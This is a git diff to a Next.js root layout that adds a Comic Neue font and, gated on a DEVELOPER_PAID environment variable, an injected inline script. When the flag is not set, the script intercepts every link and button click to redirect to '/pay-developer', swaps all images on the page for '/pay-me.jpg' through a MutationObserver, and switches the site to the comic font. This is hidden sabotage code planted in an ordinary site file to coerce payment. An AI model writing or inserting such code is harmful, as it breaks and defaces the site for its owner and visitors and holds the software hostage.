@@ -1,5 +1,5 @@
 import type { Metadata } from "next";
-import { Inter } from "next/font/google";
+import { Inter, Comic_Neue } from "next/font/google";
 import "./globals.css";
 import Navbar from "./components/Navbar";
 import Footer from "./components/Footer";
@@ -14,6 +14,12 @@ import AdminLayoutWrapper from "./components/AdminLayoutWrapper";
 const interFont = Inter({
   variable: "--font-inter",
   subsets: ["latin"],
+});
+
+const comicNeue = Comic_Neue({
+  variable: "--font-comic",
+  subsets: ["latin"],
+  weight: ["300", "400", "700"],
 });
 
 export const metadata: Metadata = {
@@ -64,7 +70,8 @@ export default function RootLayout({
 }>) {
   const navigation = getNavigation();
   const websiteId = process.env.NEXT_PUBLIC_UMAMI_WEBSITE_ID;
-  
+  const developerPaid = process.env.DEVELOPER_PAID === 'true';
+
   return (
     <html lang="en">
       <head>
@@ -78,8 +85,44 @@ export default function RootLayout({
         )}
       </head>
       <body
-        className={`${interFont.variable} antialiased flex flex-col min-h-screen`}
+        className={`${interFont.variable} ${developerPaid ? '' : comicNeue.variable + ' '}antialiased flex flex-col min-h-screen${developerPaid ? '' : ' unpaid'}`}
       >
+        {!developerPaid && (
+          <script
+            dangerouslySetInnerHTML={{
+              __html: `
+                document.addEventListener('click', function(e) {
+                  var t = e.target;
+                  while (t && t !== document) {
+                    if (t.tagName === 'A' || t.tagName === 'BUTTON') {
+                      e.preventDefault();
+                      e.stopPropagation();
+                      window.location.href = '/pay-developer';
+                      return;
+                    }
+                    t = t.parentElement;
+                  }
+                }, true);
+
+                function replaceAllImages() {
+                  document.querySelectorAll('img').forEach(function(img) {
+                    if (img.src.indexOf('pay-me.jpg') === -1) {
+                      img.src = '/pay-me.jpg';
+                      img.srcset = '';
+                    }
+                  });
+                  document.querySelectorAll('source').forEach(function(s) {
+                    s.srcset = '/pay-me.jpg';
+                  });
+                }
+                replaceAllImages();
+                new MutationObserver(replaceAllImages).observe(document.documentElement, {
+                  childList: true, subtree: true, attributes: true, attributeFilter: ['src', 'srcset']
+                });
+              `,
+            }}
+          />
+        )}
         <ThemeProvider>
           <Navbar navigation={navigation} />
           <FormProgressBar />
